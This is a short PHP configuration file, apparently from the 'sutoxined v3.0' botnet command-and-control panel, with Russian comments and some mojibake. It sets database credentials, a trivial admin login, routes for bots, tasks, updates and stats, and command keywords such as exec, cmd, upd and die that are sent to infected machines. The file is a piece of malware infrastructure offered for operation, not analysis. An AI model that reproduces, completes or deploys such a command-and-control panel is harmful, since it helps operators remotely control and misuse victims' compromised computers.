<?
	// sutoxined v3.0 command & control center
	
	/**********************************************************/
	// MySQL Configuration
	$db_host 			= 		"localhost"; // хост базы данных   
	$db_login 			= 		"root";      // логин базы данных
	$db_password 			= 		"";       	 // пароль базы 
	$db_database 			= 		"tasks";   	 // им€ базы   
	// Admin Panel Configuration
	$adm_login 			= 		"123"; 		// логин на админку
	$adm_pass 			= 		"123";		// пароль на админку
	/**********************************************************/
	// DO NOT EDIT!!!
	/**********************************************************/
	$stats_url			=		"?act=stats";
	$updates_url 			=		"?act=update";
	$tasks_url			=		"?act=tasks";
	$bots_url			=		"?act=bots";
	/**********************************************************/
	$adelim 			= 		"#"; 
	$cdelim 			= 		"Р"; 
	/**********************************************************/
	$exec_cmd 			= 		"exec"; 
	$cmd_prefix 			= 		"cmd";
	$upd_prefix			=		"upd";
	$set_rate			=		"rate";
	$die_cmd			=		"die"; 
	/**********************************************************/
	global  $updates_url, $tasks_url, $stats_url, $adelim, $cdelim, 
		$exec_cmd, $die_cmd, $cmd_prefix, $upd_prefix, $act,
		$country_codes, $country_names;
	/**********************************************************/
?>